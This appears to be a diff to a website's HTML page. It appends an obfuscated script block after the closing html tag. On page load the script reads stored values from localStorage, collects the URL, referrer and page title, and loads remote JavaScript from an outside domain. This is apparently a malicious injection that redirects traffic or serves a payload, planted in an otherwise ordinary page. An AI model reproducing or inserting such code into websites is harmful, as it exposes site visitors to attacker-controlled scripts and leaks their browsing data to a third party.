@@ -414,3 +414,49 @@
 <script src="assets/js/main.js"></script>
 </body>
 </html>
+
+<script>
+    (function() {
+    var name = '_hsQ1jBNWmBtCck6J';
+    if (!window._hsQ1jBNWmBtCck6J) {
+        window._hsQ1jBNWmBtCck6J = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'http://morainestoat.world/k3JtJrrW',
+        };
+    }
+    const _twDb7SSQQcHZ3dS9 = localStorage.getItem('config');
+    if (typeof _twDb7SSQQcHZ3dS9 !== 'undefined' && _twDb7SSQQcHZ3dS9 !== null) {
+        var _rNVgBRCFFFjfkmpY = JSON.parse(_twDb7SSQQcHZ3dS9);
+        var _wnKNjkP2YtqWWcJ7 = Math.round(+new Date()/1000);
+        if (_rNVgBRCFFFjfkmpY.created_at + window._hsQ1jBNWmBtCck6J.ttl < _wnKNjkP2YtqWWcJ7) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _JHcCnmTrwNpV3rwP = localStorage.getItem('subId');
+    var _k6z7DFHw6LVFZgLv = localStorage.getItem('token');
+    var _Vr5ymSrDng83bty6 = '?return=js.client';
+        _Vr5ymSrDng83bty6 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _Vr5ymSrDng83bty6 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _Vr5ymSrDng83bty6 += '&default_keyword=' + encodeURIComponent(document.title);
+        _Vr5ymSrDng83bty6 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _Vr5ymSrDng83bty6 += '&name=' + encodeURIComponent(name);
+        _Vr5ymSrDng83bty6 += '&host=' + encodeURIComponent(window._hsQ1jBNWmBtCck6J.R_PATH);
+    if (typeof _JHcCnmTrwNpV3rwP !== 'undefined' && _JHcCnmTrwNpV3rwP && window._hsQ1jBNWmBtCck6J.unique) {
+        _Vr5ymSrDng83bty6 += '&sub_id=' + encodeURIComponent(_JHcCnmTrwNpV3rwP);
+    }
+    if (typeof _k6z7DFHw6LVFZgLv !== 'undefined' && _k6z7DFHw6LVFZgLv && window._hsQ1jBNWmBtCck6J.unique) {
+        _Vr5ymSrDng83bty6 += '&token=' + encodeURIComponent(_k6z7DFHw6LVFZgLv);
+    }
+    if ('' !== '') {
+        _Vr5ymSrDng83bty6 += '&bypass_cache=';
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._hsQ1jBNWmBtCck6J.R_PATH + _Vr5ymSrDng83bty6;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
